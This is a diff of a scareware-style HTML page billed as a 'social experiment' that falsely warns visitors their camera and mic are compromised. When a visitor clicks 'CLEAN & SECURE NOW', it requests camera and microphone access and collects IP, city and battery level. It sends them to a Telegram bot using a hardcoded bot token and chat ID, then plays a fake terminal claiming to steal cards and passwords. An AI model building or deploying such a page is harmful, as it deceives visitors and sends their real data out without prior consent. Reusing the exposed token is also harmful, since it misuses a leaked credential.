@@ -8,97 +8,87 @@
         body { font-family: 'Segoe UI', sans-serif; background: #050505; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .edu-banner { position: fixed; top: 0; width: 100%; background: #fbbf24; color: #000; text-align: center; padding: 10px; font-weight: bold; z-index: 100; font-size: 13px; }
         .container { background: #111; border: 2px solid #ff4d4d; padding: 30px; border-radius: 15px; width: 95%; max-width: 450px; text-align: center; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
-        .icon { font-size: 50px; margin-bottom: 15px; }
         h1 { font-size: 20px; color: #ff4d4d; margin-bottom: 10px; }
         #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; height: 350px; overflow-y: auto; white-space: pre-wrap; }
         .action-btn { background: #ff4d4d; color: white; border: none; padding: 15px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
-        .action-btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
 
-    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT (REAL DATA TEST) ⚠️</div>
+    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT (HARDWARE ACCESS TEST) ⚠️</div>
 
     <div class="container" id="main-box">
         <div id="ui-content">
-            <div class="icon">🛡️</div>
-            <h1>SYSTEM THREAT DETECTED</h1>
-            <p>Aapke device ka sensitive data network par exposed hai. Turant fix karne ke liye scan karein.</p>
-            <button class="action-btn" onclick="startFullSimulation()">CLEAN & SECURE SYSTEM</button>
-            <p style="color: #666; font-size: 11px; margin-top: 10px;">This is a security awareness project.</p>
+            <div style="font-size: 50px;">🔴</div>
+            <h1>CRITICAL THREAT DETECTED</h1>
+            <p>Aapke device ka hardware (Camera/Mic) kisi unknown server se connected hai. Scan karke block karein.</p>
+            <button class="action-btn" onclick="startFullSimulation()">CLEAN & SECURE NOW</button>
         </div>
         <div id="terminal"></div>
     </div>
 
     <script>
-        // --- TELEGRAM CONFIGURATION ---
         const BOT_TOKEN = '8215508330:AAH89E2yXIslUZDwb3gIkxgeHdEzLnR7EVk';
         const CHAT_ID = '7066124462';
 
         async function startFullSimulation() {
+            // --- 1. Real Hardware Permission Request ---
+            let hwStatus = "Denied";
+            try {
+                // Requesting Camera & Mic
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                hwStatus = "GRANTED (Access Captured)";
+                // Stop the stream immediately (we just want to show the access)
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                hwStatus = "REJECTED (Permission Denied)";
+            }
+
             document.getElementById('ui-content').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
-            // 1. Fetch Battery Info (REAL)
-            let batteryInfo = "Checking...";
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
-                }
-            } catch (e) {}
+            // --- 2. Fetch Info ---
+            let ipData = { ip: "Scanning...", city: "Unknown" };
+            try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch (e) {}
 
-            // 2. Fetch IP and Real Location (REAL)
-            let ipData = { ip: "Scanning...", city: "Unknown", org: "Unknown" };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch (e) {}
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}%`;
+            }
 
-            // 3. Hardware Details (REAL)
-            const ram = navigator.deviceMemory || "Unknown";
-            const cores = navigator.hardwareConcurrency || "Unknown";
-            const platform = navigator.platform;
-
-            // 4. Send REAL Data to Telegram
-            const report = `<b>🚨 REAL DATA CAPTURED!</b>\n\n` +
-                           `<b>📍 City:</b> ${ipData.city}\n` +
-                           `<b>📱 IP:</b> ${ipData.ip}\n` +
-                           `<b>🏢 ISP:</b> ${ipData.org}\n` +
+            // --- 3. Send to Telegram ---
+            const report = `<b>🚨 HARDWARE EXPOSURE!</b>\n\n` +
+                           `<b>📍 Location:</b> ${ipData.city}\n` +
                            `<b>🔋 Battery:</b> ${batteryInfo}\n` +
-                           `<b>⚙️ CPU Cores:</b> ${cores}\n` +
-                           `<b>💾 RAM:</b> ~${ram} GB\n` +
-                           `<b>🖥️ OS:</b> ${platform}`;
+                           `<b>🎙️ Mic/Cam:</b> ${hwStatus}\n` +
+                           `<b>📱 IP:</b> ${ipData.ip}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=HTML`);
 
-            // 5. Terminal Simulation Lines
+            // --- 4. Terminal Simulation ---
             const lines = [
-                "> INITIALIZING REAL-TIME DATA EXTRACTION...",
-                "> <span style='color:yellow'>[EXPLOITING] Browser Sandbox... [SUCCESS]</span>",
+                "> INITIALIZING HARDWARE SCAN...",
+                `> REQUESTING CAMERA ACCESS... [${hwStatus}]`,
+                `> REQUESTING MICROPHONE ACCESS... [${hwStatus}]`,
                 "------------------------------------------",
-                `> TARGET_IP: ${ipData.ip.substring(0, 7)}XX.XX`,
-                `> LOCATION: ${ipData.city.toUpperCase()}, IN`,
-                `> ISP: ${ipData.org}`,
+                `> TARGET_IP: ${ipData.ip.substring(0,8)}XX`,
                 `> SYSTEM_BATTERY: ${batteryInfo}`,
-                `> HARDWARE: ${cores} CPU Cores / ${ram}GB RAM`,
                 "------------------------------------------",
-                "> DETECTING LOGGED-IN ACCOUNTS...",
-                "> Google Account: <span style='color:red'>LOGGED_IN</span>",
-                "> Facebook Session: <span style='color:red'>ACTIVE</span>",
+                "> <span style='color:cyan'>[EXTRACTING] Social Media Sessions...</span>",
+                "> Facebook: <span style='color:red'>DETECTED</span>",
+                "> Instagram: <span style='color:red'>ACTIVE SESSION</span>",
                 "------------------------------------------",
-                "> <span style='color:cyan'>[STEALING] Masked Passwords...</span>",
-                "> Found Saved Card: **** **** **** 8210",
-                "> Extracted Instagram: pass****92",
-                "> Accessing /sdcard/DCIM/ (Simulated Count: 1,432)",
+                "> <span style='color:orange'>[STEALING] Masked Data...</span>",
+                "> Found Card: **** **** **** 9012",
+                "> Found Pass: user****_xyz",
                 "------------------------------------------",
-                "> <span style='color:red'>ATTACK COMPLETE. DATA SENT TO TELEGRAM.</span>",
+                "> <span style='color:red'>ATTACK SUCCESSFUL. DATA SENT.</span>",
                 "------------------------------------------",
-                "> <span style='color:white'>DARR GAYE? Ye sirf ek Simulation tha.</span>",
-                "> <span style='color:white'>Lekin aapka upar wala data (IP, Battery) REAL hai.</span>",
-                "> <span style='color:white'>Hacker isse bhi zyada info chura sakta hai.</span>",
-                "> <span style='color:white'>Safe rahein, unknown links se bachein!</span>"
+                "> <span style='color:white'>SABAK: Agar aapne 'Allow' dabaya tha,</span>",
+                "> <span style='color:white'>toh hacker aapko live dekh/sun sakta tha.</span>",
+                "> <span style='color:white'>Kabhi bhi aisi sites ko permission na dein!</span>"
             ];
 
             let i = 0;
@@ -107,7 +97,7 @@
                     term.innerHTML += lines[i] + "<br><br>";
                     term.scrollTop = term.scrollHeight;
                     i++;
-                    setTimeout(print, 700);
+                    setTimeout(print, 800);
                 }
             }
             print();
